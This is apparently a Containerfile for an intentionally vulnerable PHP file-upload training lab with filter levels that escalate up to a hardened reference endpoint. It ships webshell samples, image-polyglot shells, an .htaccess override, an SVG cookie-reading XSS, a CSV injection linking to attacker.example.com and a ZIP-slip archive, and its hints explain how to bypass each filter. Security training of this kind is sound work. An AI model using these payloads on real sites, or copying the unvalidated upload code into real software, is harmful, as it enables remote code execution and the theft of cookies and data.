# redteam/file-upload.Containerfile
# PHP/Apache file upload lab with multiple endpoints at escalating filter
# levels: no filter, blacklist, whitelist, MIME check, getimagesize() check,
# and a hardened endpoint, plus .htaccess and .user.ini override examples.
#
# WARNING: This container is intentionally vulnerable. Run it only on an
# isolated, trusted network and never expose it to the internet.
#
# Build:
#   podman build -t file-upload-lab -f redteam/file-upload.Containerfile .
#
# Run:
#   podman run -d --name upload-lab -p 8080:80 file-upload-lab
#
# Access:
#   http://localhost:8080/                     - landing page
#   http://localhost:8080/upload-no-filter.php - no validation
#   http://localhost:8080/upload-blacklist.php - extension blacklist
#   http://localhost:8080/upload-whitelist.php - extension whitelist
#   http://localhost:8080/upload-mime.php      - Content-Type check
#   http://localhost:8080/upload-image.php     - getimagesize() check
#   http://localhost:8080/upload-secure.php    - hardened endpoint
#   http://localhost:8080/uploads/             - directory listing

FROM php:8.2-apache

LABEL description="File Upload Lab - PHP app with multiple upload endpoints, escalating filter levels, htaccess demos"

RUN apt-get update && apt-get install -y --no-install-recommends \
    libgd-dev \
    imagemagick \
    curl \
    && docker-php-ext-install gd && \
    rm -rf /var/lib/apt/lists/*

RUN mkdir -p /var/www/html/uploads

# === Enable Apache modules ===
RUN a2enmod rewrite headers autoindex

# === Pre-load malicious upload examples ===
RUN mkdir -p /var/www/html/examples

# Example 1: Simple PHP webshell
RUN echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/examples/simple-webshell.php

# Example 2: GIF+PHP polyglot
RUN printf 'GIF89a\0\0\0\0\0<?php system(\$_GET["cmd"]); ?>' > /var/www/html/examples/polyglot.gif.php

# Example 3: .htaccess override
RUN printf 'AddType application/x-httpd-php .jpg\n' > /var/www/html/examples/htaccess-override.txt && \
    echo '# Upload this as .htaccess to make .jpg files execute as PHP' >> /var/www/html/examples/htaccess-override.txt

# Example 4: PHP with JPEG magic bytes
RUN printf '\xff\xd8\xff\xe0<?php system(\$_GET["cmd"]); ?>' > /var/www/html/examples/jpeg-header.php

# Example 5: SVG XSS
RUN cat > /var/www/html/examples/xss.svg << 'SVGEOF'
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
  <rect width="100%" height="100%" fill="red"/>
</svg>
SVGEOF

# Example 6: CSV injection
RUN cat > /var/www/html/examples/formula.csv << 'CSVEOF'
Name,Email,Phone
=HYPERLINK("http://attacker.example.com/collect","Click Me")
=cmd|'/C calc'!A0
@SUM(1+2)
CSVEOF

# Example 7: ZIP slip archive
RUN python3 -c "
import zipfile
with zipfile.ZipFile('/var/www/html/examples/traversal.zip', 'w') as zf:
    zf.writestr('../../../var/www/html/uploads/shell-via-zip.php',
                '<?php system(\$_GET[\"cmd\"]); ?>')
    zf.writestr('normal-file.txt', 'This is a normal file')
print('ZIP slip archive created')
" 2>/dev/null || true

# === Create the main PHP application ===
RUN cat > /var/www/html/index.html << 'HTMLEOF'
<!DOCTYPE html>
<html><head><title>File Upload Lab</title>
<style>body{font-family:monospace;margin:20px;max-width:900px}
.section{border:1px solid #ccc;padding:15px;margin:12px 0;background:#f9f9f9}
h3{margin-top:0} h2{border-bottom:2px solid #333}
.label{display:inline-block;color:#fff;padding:2px 8px;border-radius:3px;font-size:11px}
.safe{background:#00aa00} .vuln{background:#cc0000} .partial{background:#cc8800}
form{margin:8px 0} input,select{padding:4px;margin:3px}
pre{background:#eee;padding:8px;overflow:auto;border:1px solid #ddd;max-height:200px}
a{color:#0066cc}
</style></head><body>
<h1>File Upload Lab</h1>
<p>Practice file upload exploitation across escalating filter levels. Upload webshells and bypass filters.</p>
<p><strong>Upload directory:</strong> <a href="/uploads/">/uploads/</a> (directory listing enabled)</p>

<div class="section">
<h3><span class="label vuln">VULNERABLE</span> Level 1: No Filter</h3>
<p>Accepts any file. The baseline vulnerability — no validation at all.</p>
<form action="/upload-no-filter.php" method="POST" enctype="multipart/form-data">
  <input type="file" name="uploaded_file" required>
  <input type="submit" value="Upload (No Filter)">
</form>
</div>

<div class="section">
<h3><span class="label vuln">VULNERABLE</span> Level 2: Extension Blacklist</h3>
<p>Blocks: .php, .phtml, .php3, .php4, .php5, .php7, .php8, .phar</p>
<p>Bypass: .PhP, .pht, .phps, .shtml, .php.jpg, .php.png</p>
<form action="/upload-blacklist.php" method="POST" enctype="multipart/form-data">
  <input type="file" name="uploaded_file" required>
  <input type="submit" value="Upload (Blacklist)">
</form>
</div>

<div class="section">
<h3><span class="label vuln">VULNERABLE</span> Level 3: Extension Whitelist</h3>
<p>Only allows: .jpg, .jpeg, .png, .gif</p>
<p>Bypass: upload .htaccess to add PHP handler for .jpg, then upload PHP in .jpg</p>
<form action="/upload-whitelist.php" method="POST" enctype="multipart/form-data">
  <input type="file" name="uploaded_file" required>
  <input type="submit" value="Upload (Whitelist)">
</form>
</div>

<div class="section">
<h3><span class="label vuln">VULNERABLE</span> Level 4: Content-Type Check</h3>
<p>Checks: <code>$_FILES['uploaded_file']['type']</code> must start with <code>image/</code></p>
<p>Bypass: change Content-Type header in the request (client-controllable)</p>
<form action="/upload-mime.php" method="POST" enctype="multipart/form-data">
  <input type="file" name="uploaded_file" required>
  <input type="submit" value="Upload (MIME Check)">
</form>
</div>

<div class="section">
<h3><span class="label vuln">VULNERABLE</span> Level 5: getimagesize() Check</h3>
<p>Checks: <code>getimagesize()</code> must return valid dimensions</p>
<p>Bypass: GIF89a header or polyglot file (valid image + PHP code)</p>
<form action="/upload-imagesize.php" method="POST" enctype="multipart/form-data">
  <input type="file" name="uploaded_file" required>
  <input type="submit" value="Upload (getimagesize)">
</form>
</div>

<div class="section">
<h3><span class="label partial">BLACKLIST+WHITELIST</span> Level 6: Combined Filters</h3>
<p>Extension blacklist + Client-side MIME check + File size check</p>
<p>Bypass: craft a small GIF+PHP polyglot with .phps or .pht extension</p>
<form action="/upload-combined.php" method="POST" enctype="multipart/form-data">
  <input type="file" name="uploaded_file" required>
  <input type="submit" value="Upload (Combined)">
</form>
</div>

<div class="section">
<h3><span class="label vuln">VULNERABLE</span> Level 7: Zip Upload + Extract</h3>
<p>Uploads a ZIP file and extracts it. Vulnerable to ZIP slip (path traversal in archive).</p>
<form action="/upload-zip.php" method="POST" enctype="multipart/form-data">
  <input type="file" name="zip_file" required>
  <input type="submit" value="Upload ZIP">
</form>
</div>

<div class="section">
<h3><span class="label vuln">VULNERABLE</span> Level 8: SVG Upload</h3>
<p>Accepts SVG files. SVG can contain JavaScript (XSS). View uploaded SVG directly.</p>
<form action="/upload-svg.php" method="POST" enctype="multipart/form-data">
  <input type="file" name="uploaded_file" accept=".svg">
  <input type="submit" value="Upload SVG">
</form>
</div>

<div class="section">
<h3><span class="label safe">SAFE</span> Secure Upload (Reference)</h3>
<p>Proper validation: extension whitelist + MIME detection + getimagesize() + random filename + no execute permissions</p>
<form action="/upload-secure.php" method="POST" enctype="multipart/form-data">
  <input type="file" name="uploaded_file" required>
  <input type="submit" value="Upload (Secure)">
</form>
</div>

<h3>Examples</h3>
<p>Pre-built exploit files: <a href="/examples/">/examples/</a></p>

</body></html>
HTMLEOF

# === Level 1: No Filter ===
RUN cat > /var/www/html/upload-no-filter.php << 'PHPEOF'
<?php
$upload_dir = '/var/www/html/uploads/';
$message = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['uploaded_file'])) {
    $target = $upload_dir . basename($_FILES['uploaded_file']['name']);
    if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $target)) {
        $message = "SUCCESS: File uploaded to /uploads/" . basename($_FILES['uploaded_file']['name']);
        $message .= "\n<a href='/uploads/" . basename($_FILES['uploaded_file']['name']) . "'>Open file</a>";
    } else {
        $message = "ERROR: Upload failed.";
    }
}
?>
<!DOCTYPE html>
<html><head><title>Upload — No Filter</title>
<style>body{font-family:monospace;margin:20px} pre{background:#eee;padding:10px}</style></head><body>
<h2>Level 1: No Filter</h2>
<form method="POST" enctype="multipart/form-data">
  <input type="file" name="uploaded_file" required>
  <input type="submit" value="Upload">
</form>
<?php if($message): ?><pre><?php echo htmlspecialchars($message); ?></pre><?php endif; ?>
<p><a href="/">← Back to lab</a></p>
</body></html>
PHPEOF

# === Level 2: Extension Blacklist ===
RUN cat > /var/www/html/upload-blacklist.php << 'PHPEOF'
<?php
$upload_dir = '/var/www/html/uploads/';
$message = '';

$blacklist = ['php', 'phtml', 'php3', 'php4', 'php5', 'php7', 'php8', 'phar'];

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['uploaded_file'])) {
    $filename = $_FILES['uploaded_file']['name'];
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));

    if (in_array($ext, $blacklist)) {
        $message = "BLOCKED: Extension .$ext is blacklisted.";
    } else {
        $target = $upload_dir . basename($filename);
        if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $target)) {
            $message = "SUCCESS: File uploaded to /uploads/" . basename($filename);
            $message .= "\n<a href='/uploads/" . basename($filename) . "'>Open file</a>";
        } else {
            $message = "ERROR: Upload failed.";
        }
    }
}
?>
<!DOCTYPE html>
<html><head><title>Upload — Blacklist</title>
<style>body{font-family:monospace;margin:20px} pre{background:#eee;padding:10px}</style></head><body>
<h2>Level 2: Extension Blacklist</h2>
<p>Blacklisted: <?php echo implode(', ', $blacklist); ?></p>
<form method="POST" enctype="multipart/form-data">
  <input type="file" name="uploaded_file" required>
  <input type="submit" value="Upload">
</form>
<?php if($message): ?><pre><?php echo htmlspecialchars($message); ?></pre><?php endif; ?>
<p><a href="/">← Back to lab</a></p>
</body></html>
PHPEOF

# === Level 3: Extension Whitelist ===
RUN cat > /var/www/html/upload-whitelist.php << 'PHPEOF'
<?php
$upload_dir = '/var/www/html/uploads/';
$message = '';

$whitelist = ['jpg', 'jpeg', 'png', 'gif'];

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['uploaded_file'])) {
    $filename = $_FILES['uploaded_file']['name'];
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));

    if (!in_array($ext, $whitelist)) {
        $message = "BLOCKED: Only " . implode(', ', $whitelist) . " files allowed. Got: .$ext";
    } else {
        $target = $upload_dir . basename($filename);
        if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $target)) {
            $message = "SUCCESS: File uploaded to /uploads/" . basename($filename);
            $message .= "\n<a href='/uploads/" . basename($filename) . "'>Open file</a>";
            $message .= "\n\nHint: Try uploading .htaccess first to override the handler.";
        } else {
            $message = "ERROR: Upload failed.";
        }
    }
}
?>
<!DOCTYPE html>
<html><head><title>Upload — Whitelist</title>
<style>body{font-family:monospace;margin:20px} pre{background:#eee;padding:10px}</style></head><body>
<h2>Level 3: Extension Whitelist</h2>
<p>Allowed: <?php echo implode(', ', $whitelist); ?></p>
<form method="POST" enctype="multipart/form-data">
  <input type="file" name="uploaded_file" required>
  <input type="submit" value="Upload">
</form>
<?php if($message): ?><pre><?php echo htmlspecialchars($message); ?></pre><?php endif; ?>
<p><a href="/">← Back to lab</a></p>
</body></html>
PHPEOF

# === Level 4: Content-Type Check ===
RUN cat > /var/www/html/upload-mime.php << 'PHPEOF'
<?php
$upload_dir = '/var/www/html/uploads/';
$message = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['uploaded_file'])) {
    $mime = $_FILES['uploaded_file']['type'];

    if (strpos($mime, 'image/') !== 0) {
        $message = "BLOCKED: Content-Type must be image/*. Got: $mime";
    } else {
        $target = $upload_dir . basename($_FILES['uploaded_file']['name']);
        if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $target)) {
            $message = "SUCCESS: File uploaded to /uploads/" . basename($_FILES['uploaded_file']['name']);
            $message .= "\nMIME received: $mime";
            $message .= "\n<a href='/uploads/" . basename($_FILES['uploaded_file']['name']) . "'>Open file</a>";
            $message .= "\n\nHint: Content-Type is sent by the CLIENT. Try curl with -F 'file=@shell.php;type=image/jpeg'";
        } else {
            $message = "ERROR: Upload failed.";
        }
    }
}
?>
<!DOCTYPE html>
<html><head><title>Upload — MIME Check</title>
<style>body{font-family:monospace;margin:20px} pre{background:#eee;padding:10px}</style></head><body>
<h2>Level 4: Content-Type Check</h2>
<p>Only allows Content-Type starting with <code>image/</code></p>
<form method="POST" enctype="multipart/form-data">
  <input type="file" name="uploaded_file" required>
  <input type="submit" value="Upload">
</form>
<?php if($message): ?><pre><?php echo htmlspecialchars($message); ?></pre><?php endif; ?>
<p><a href="/">← Back to lab</a></p>
</body></html>
PHPEOF

# === Level 5: getimagesize() ===
RUN cat > /var/www/html/upload-imagesize.php << 'PHPEOF'
<?php
$upload_dir = '/var/www/html/uploads/';
$message = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['uploaded_file'])) {
    $tmp = $_FILES['uploaded_file']['tmp_name'];
    $filename = $_FILES['uploaded_file']['name'];

    $img_info = @getimagesize($tmp);
    if ($img_info === false) {
        $message = "BLOCKED: getimagesize() failed. Not a valid image file.";
        $message .= "\nMIME detected by getimagesize(): " . ($img_info['mime'] ?? 'none');
    } else {
        $target = $upload_dir . basename($filename);
        if (move_uploaded_file($tmp, $target)) {
            $message = "SUCCESS: File uploaded to /uploads/" . basename($filename);
            $message .= "\ngetimagesize() result: {$img_info[0]}x{$img_info[1]} ({$img_info['mime']})";
            $message .= "\n<a href='/uploads/" . basename($filename) . "'>Open file</a>";
            $message .= "\n\nHint: GIF89a header passes getimagesize(). Create a GIF+PHP polyglot.";
        } else {
            $message = "ERROR: Upload failed.";
        }
    }
}
?>
<!DOCTYPE html>
<html><head><title>Upload — getimagesize()</title>
<style>body{font-family:monospace;margin:20px} pre{background:#eee;padding:10px}</style></head><body>
<h2>Level 5: getimagesize() Check</h2>
<form method="POST" enctype="multipart/form-data">
  <input type="file" name="uploaded_file" required>
  <input type="submit" value="Upload">
</form>
<?php if($message): ?><pre><?php echo htmlspecialchars($message); ?></pre><?php endif; ?>
<p><a href="/">← Back to lab</a></p>
</body></html>
PHPEOF

# === Level 6: Combined Filters ===
RUN cat > /var/www/html/upload-combined.php << 'PHPEOF'
<?php
$upload_dir = '/var/www/html/uploads/';
$message = '';

$blacklist = ['php', 'phtml', 'php3', 'php4', 'php5', 'php7', 'php8', 'phar', 'asp', 'aspx', 'jsp'];
$max_size = 1024 * 1024; // 1MB

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['uploaded_file'])) {
    $tmp = $_FILES['uploaded_file']['tmp_name'];
    $filename = $_FILES['uploaded_file']['name'];
    $mime = $_FILES['uploaded_file']['type'];

    // Check 1: MIME type
    if (strpos($mime, 'image/') !== 0) {
        $message = "BLOCKED: Content-Type must be image/*. Got: $mime";
    }
    // Check 2: File size
    elseif ($_FILES['uploaded_file']['size'] > $max_size) {
        $message = "BLOCKED: File too large. Max 1MB.";
    }
    // Check 3: Extension blacklist
    elseif (in_array(strtolower(pathinfo($filename, PATHINFO_EXTENSION)), $blacklist)) {
        $message = "BLOCKED: Extension is blacklisted.";
    }
    else {
        $target = $upload_dir . basename($filename);
        if (move_uploaded_file($tmp, $target)) {
            $message = "SUCCESS: File uploaded to /uploads/" . basename($filename);
            $message .= "\n<a href='/uploads/" . basename($filename) . "'>Open file</a>";
            $message .= "\n\nHint: .pht, .phps, .shtml are not in the blacklist. Also try .php.jpg.";
        } else {
            $message = "ERROR: Upload failed.";
        }
    }
}
?>
<!DOCTYPE html>
<html><head><title>Upload — Combined</title>
<style>body{font-family:monospace;margin:20px} pre{background:#eee;padding:10px}</style></head><body>
<h2>Level 6: Combined Filters</h2>
<p>MIME check + Size check + Extension blacklist</p>
<form method="POST" enctype="multipart/form-data">
  <input type="file" name="uploaded_file" required>
  <input type="submit" value="Upload">
</form>
<?php if($message): ?><pre><?php echo htmlspecialchars($message); ?></pre><?php endif; ?>
<p><a href="/">← Back to lab</a></p>
</body></html>
PHPEOF

# === Level 7: ZIP Upload ===
RUN cat > /var/www/html/upload-zip.php << 'PHPEOF'
<?php
$upload_dir = '/var/www/html/uploads/';
$message = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['zip_file'])) {
    $tmp = $_FILES['zip_file']['tmp_name'];
    $filename = $_FILES['zip_file']['name'];
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));

    if ($ext !== 'zip') {
        $message = "BLOCKED: Only .zip files allowed.";
    } else {
        $target = $upload_dir . basename($filename);
        if (move_uploaded_file($tmp, $target)) {
            // Extract the ZIP — VULNERABLE to path traversal in filenames
            $zip = new ZipArchive();
            if ($zip->open($target) === TRUE) {
                $extracted = [];
                for ($i = 0; $i < $zip->numFiles; $i++) {
                    $entry = $zip->getNameIndex($i);
                    // VULNERABLE: no path sanitization before extraction
                    $zip->extractTo($upload_dir, $entry);
                    $extracted[] = $entry;
                }
                $zip->close();
                $message = "SUCCESS: ZIP uploaded and extracted.\n";
                $message .= "Files extracted:\n";
                foreach ($extracted as $e) {
                    $message .= "  - /uploads/$e\n";
                }
                $message .= "\nNote: If a file had ../../../ in its name, it might have been written outside /uploads/.";
            } else {
                $message = "ERROR: Failed to open ZIP file.";
            }
        } else {
            $message = "ERROR: Upload failed.";
        }
    }
}
?>
<!DOCTYPE html>
<html><head><title>Upload — ZIP</title>
<style>body{font-family:monospace;margin:20px} pre{background:#eee;padding:10px}</style></head><body>
<h2>Level 7: ZIP Upload + Extract</h2>
<form method="POST" enctype="multipart/form-data">
  <input type="file" name="zip_file" accept=".zip" required>
  <input type="submit" value="Upload ZIP">
</form>
<?php if($message): ?><pre><?php echo htmlspecialchars($message); ?></pre><?php endif; ?>
<p><small>Pre-made ZIP slip: <a href="/examples/traversal.zip">/examples/traversal.zip</a></small></p>
<p><a href="/">← Back to lab</a></p>
</body></html>
PHPEOF

# === Level 8: SVG Upload ===
RUN cat > /var/www/html/upload-svg.php << 'PHPEOF'
<?php
$upload_dir = '/var/www/html/uploads/';
$message = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['uploaded_file'])) {
    $filename = $_FILES['uploaded_file']['name'];
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));

    if ($ext !== 'svg') {
        $message = "BLOCKED: Only .svg files allowed.";
    } else {
        $target = $upload_dir . basename($filename);
        if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $target)) {
            $message = "SUCCESS: SVG uploaded to /uploads/" . basename($filename);
            $message .= "\n<a href='/uploads/" . basename($filename) . "' target='_blank'>View SVG (XSS may execute!)</a>";
        } else {
            $message = "ERROR: Upload failed.";
        }
    }
}
?>
<!DOCTYPE html>
<html><head><title>Upload — SVG</title>
<style>body{font-family:monospace;margin:20px} pre{background:#eee;padding:10px}</style></head><body>
<h2>Level 8: SVG Upload (XSS)</h2>
<p>SVG files can contain JavaScript. When viewed in a browser, the script executes.</p>
<form method="POST" enctype="multipart/form-data">
  <input type="file" name="uploaded_file" accept=".svg" required>
  <input type="submit" value="Upload SVG">
</form>
<?php if($message): ?><pre><?php echo htmlspecialchars($message); ?></pre><?php endif; ?>
<p><small>Pre-made SVG XSS: <a href="/examples/xss.svg">/examples/xss.svg</a></small></p>
<p><a href="/">← Back to lab</a></p>
</body></html>
PHPEOF

# === Secure Upload Reference ===
RUN cat > /var/www/html/upload-secure.php << 'PHPEOF'
<?php
$upload_dir = '/var/www/html/uploads/';
$message = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['uploaded_file'])) {
    $tmp = $_FILES['uploaded_file']['tmp_name'];
    $orig_name = $_FILES['uploaded_file']['name'];
    $ext = strtolower(pathinfo($orig_name, PATHINFO_EXTENSION));

    // 1. Extension whitelist
    $allowed_ext = ['jpg', 'jpeg', 'png', 'gif'];
    if (!in_array($ext, $allowed_ext)) {
        $message = "BLOCKED: Invalid extension.";
    }
    // 2. Validate MIME type via finfo (not client header)
    else {
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $detected_mime = finfo_file($finfo, $tmp);
        finfo_close($finfo);

        $allowed_mime = ['image/jpeg', 'image/png', 'image/gif'];
        if (!in_array($detected_mime, $allowed_mime)) {
            $message = "BLOCKED: Invalid file content. Detected as: $detected_mime";
        }
        // 3. Validate image dimensions
        else {
            $img_info = @getimagesize($tmp);
            if ($img_info === false) {
                $message = "BLOCKED: Not a valid image.";
            }
            // 4. Generate random filename (prevents overwriting and direct access guessing)
            else {
                $new_name = bin2hex(random_bytes(16)) . '.' . $ext;
                $target = $upload_dir . $new_name;
                if (move_uploaded_file($tmp, $target)) {
                    // 5. Remove execute permissions
                    chmod($target, 0644);
                    $message = "SUCCESS: Image uploaded securely as /uploads/$new_name";
                    $message .= "\nDimensions: {$img_info[0]}x{$img_info[1]} ({$img_info['mime']})";
                    $message .= "\nOriginal name was discarded for security.";
                } else {
                    $message = "ERROR: Upload failed.";
                }
            }
        }
    }
}
?>
<!DOCTYPE html>
<html><head><title>Upload — Secure</title>
<style>body{font-family:monospace;margin:20px} pre{background:#eee;padding:10px}</style></head><body>
<h2>Secure Upload (Reference Implementation)</h2>
<p>This endpoint uses: extension whitelist + MIME detection via finfo + getimagesize() + random filename + chmod 0644</p>
<form method="POST" enctype="multipart/form-data">
  <input type="file" name="uploaded_file" required>
  <input type="submit" value="Upload (Secure)">
</form>
<?php if($message): ?><pre><?php echo htmlspecialchars($message); ?></pre><?php endif; ?>
<p><a href="/">← Back to lab</a></p>
</body></html>
PHPEOF

# === Apache configuration for uploads directory ===
RUN cat > /var/www/html/uploads/.htaccess << 'HTACCESS'
# Default: allow directory listing so you can see uploaded files
Options +Indexes

# To test .htaccess upload override:
# 1. Upload a .htaccess containing: AddType application/x-httpd-php .jpg
# 2. Then upload a .jpg file with PHP code
# 3. The .jpg file will execute as PHP
HTACCESS

# Ensure uploads directory has correct permissions
RUN chown -R www-data:www-data /var/www/html/uploads && \
    chmod 755 /var/www/html/uploads && \
    chown -R www-data:www-data /var/www/html/examples && \
    chmod 755 /var/www/html/examples

EXPOSE 80

CMD ["apache2-foreground"]
